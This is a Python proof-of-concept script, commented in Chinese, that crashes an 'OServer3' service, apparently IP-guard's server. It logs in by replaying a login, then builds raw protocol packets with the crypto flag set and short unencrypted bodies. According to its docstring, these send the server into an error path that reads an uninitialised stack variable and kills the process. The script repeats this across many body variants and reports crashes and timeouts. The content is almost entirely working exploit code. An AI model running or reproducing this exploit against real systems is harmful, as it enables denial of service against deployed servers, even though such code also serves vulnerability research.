"""poc_4E00_crash.py — 触发 OServer3 进程崩溃 (cmd=0x4014/sub=6 + flags=0x4E00 + 原始 4B body)

关键修复: 上次的 PoC 用 build_packet_with_state, 它对 flags=0x4E00 自动做了
  zlib.compress + AES-CBC encrypt, 导致线上 body 是 ~32B 不是 4B。
本版手动构造 OCP header, body 直接放 4 字节原始字节, 服务器收到后会按 FLAG_CRYPT
试 AES-CBC 解密 4B 输入 → 不是 16B 倍数 → 走入异常路径 → 读未初始化栈变量。

用法:
  python poc_4E00_crash.py 192.168.2.130 8236 Admin admin123456 [count]
"""
import os, socket, struct, sys, time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from ipguard_login.login import replay_login, SESSION_FP_DEFAULT
from ipguard_login.crypto import HDR_MAGIC, obf_header


def fresh_session(host, port, user, pwd, timeout=15.0):
    base_nonce = struct.unpack("<I", os.urandom(3) + b"\x00")[0] | 0x00100000
    s = socket.create_connection((host, port), timeout=timeout)
    s.settimeout(timeout)
    idx, lr, st, _ = replay_login(s, user, pwd, base_nonce, show_crypto=False, verbose=False)
    return s, base_nonce, idx, lr, st


def build_raw_packet(flags, cmd, sub, nonce, sess_state_16_24, fp8, raw_body):
    """手动构造 OCP 包, body 字段为 raw 字节, 不做加密/压缩。"""
    assert len(sess_state_16_24) == 8
    assert len(fp8) == 8
    # key 字段 = 0000 + nonce + sess_state (跟 build_packet_with_state 一致, 即使我们不用它)
    key16 = b"\x00" * 4 + struct.pack("<I", nonce) + sess_state_16_24
    hdr = bytearray(32)
    hdr[0:2] = HDR_MAGIC
    struct.pack_into("<H", hdr, 2, flags)
    struct.pack_into("<H", hdr, 4, cmd)
    struct.pack_into("<H", hdr, 6, sub)
    hdr[8:24] = key16
    hdr[24:32] = fp8
    struct.pack_into("<I", hdr, 28, len(raw_body))   # payload_len = raw_body 长度
    return obf_header(bytes(hdr)) + raw_body


def fire_crash(host, port, user, pwd, raw_body):
    try:
        s, bn, idx, lr, st = fresh_session(host, port, user, pwd)
    except Exception as e:
        return {"phase": "login", "err": str(e)}
    try:
        next_nonce = (bn + idx) & 0xFFFFFFFF
        pkt = build_raw_packet(
            flags=0x4E00, cmd=0x4014, sub=6,
            nonce=next_nonce,
            sess_state_16_24=struct.pack("<II", lr, st),
            fp8=SESSION_FP_DEFAULT,
            raw_body=raw_body,
        )
        s.sendall(pkt)
        # 期望: 连接被断或超时 (server 崩了由 guard 重启)
        s.settimeout(3.0)
        try:
            data = s.recv(4096)
            if not data:
                return {"result": "TCP closed (crash candidate)"}
            return {"result": "responded", "hex": data[:64].hex()}
        except socket.timeout:
            return {"result": "TIMEOUT (probable crash/hang)"}
        except ConnectionResetError:
            return {"result": "ECONNRESET (process crashed)"}
        except OSError as e:
            return {"result": f"OS err: {e}"}
    finally:
        try: s.close()
        except: pass


def main():
    if len(sys.argv) < 5:
        print(__doc__); sys.exit(1)
    host, port = sys.argv[1], int(sys.argv[2])
    user, pwd = sys.argv[3], sys.argv[4]
    count = int(sys.argv[5]) if len(sys.argv) >= 6 else 2

    print(f"[*] Target: {host}:{port}")
    print(f"[*] cmd=0x4014/sub=6 flags=0x4E00  RAW 4-byte body\n")

    variants = [
        # (label, body bytes - 长度 NOT 必须 4)
        ("len=4 zero",    b"\x00\x00\x00\x00"),
        ("len=4 0xAA",    b"\xaa\xaa\xaa\xaa"),
        ("len=4 0x41",    b"\x41\x41\x41\x41"),
        ("len=4 magic",   struct.pack("<I", 0xDEADBEEF)),
        ("len=4 magic2",  struct.pack("<I", 0x41414141)),
        # 也试其它长度 (8/12/15 非 16 倍数)
        ("len=8 zero",    b"\x00" * 8),
        ("len=12 zero",   b"\x00" * 12),
        ("len=15 zero",   b"\x00" * 15),
        ("len=1 zero",    b"\x00"),
        ("len=0",         b""),
    ]

    for label, body in variants:
        print(f"=== {label} ({len(body)}B {body.hex() or '<empty>'}) ===")
        for i in range(count):
            r = fire_crash(host, port, user, pwd, body)
            print(f"  round {i+1}: {r.get('result', r.get('err', '?'))}")
            time.sleep(1.2)
        print()


if __name__ == "__main__":
    main()
